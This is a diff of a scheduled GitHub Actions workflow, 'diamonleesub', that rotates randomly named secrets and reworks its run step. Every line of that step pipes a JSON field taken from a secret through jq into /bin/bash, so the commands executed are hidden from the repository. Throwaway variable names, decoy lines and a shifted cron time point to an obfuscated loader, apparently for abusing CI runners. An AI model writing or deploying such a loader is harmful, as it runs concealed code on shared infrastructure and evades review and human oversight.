@@ -1,30 +1,26 @@
 name: diamonleesub
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 2/6 * * *'
+    - cron: '53 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: diamonleesub
         env:
-          xho2245: ${{ secrets.xho2245 }}
+          eso8949: ${{ secrets.eso8949 }}
         run: |
-          echo $xho2245 | jq -r .yz57120 | /bin/bash
-          echo $oyzzb4 | jq -r .mvxf65 | /bin/bash
-          echo $pwflb6405 | jq -r .a69 | /bin/bash
-          echo $js23 | jq -r .xvukw10063 | /bin/bash
-          echo $b7 | jq -r .quqpq88685 | /bin/bash
-          echo $kscan16 | jq -r .tutc11 | /bin/bash
-          echo $mn74 | jq -r .fz9899 | /bin/bash
-          echo $m6844 | jq -r .dfxrv12527 | /bin/bash
-          echo $zgiwr2 | jq -r .doqh147 | /bin/bash
-          echo $ob699 | jq -r .kjb96 | /bin/bash
-          echo $qbfmk3358 | jq -r .ytrj9 | /bin/bash
-          echo $abu623 | jq -r .vvrye7 | /bin/bash
-          echo $wan908 | jq -r .zeuo34 | /bin/bash
-          echo $bl30 | jq -r .b1 | /bin/bash
+          echo $eso8949 | jq -r .yh067 | /bin/bash
+          echo $q349 | jq -r .vu9 | /bin/bash
+          echo $nkia78065 | jq -r .sk32744 | /bin/bash
+          echo $dixbh9116 | jq -r .xxe6228 | /bin/bash
+          echo $rltv21 | jq -r .p26160 | /bin/bash
+          echo $vxbx95846 | jq -r .frvwq844 | /bin/bash
+          echo $fa3432 | jq -r .n08940 | /bin/bash
+          echo $ubp6268 | jq -r .ifp40 | /bin/bash
+          echo $bpuxo91576 | jq -r .hj69 | /bin/bash
 
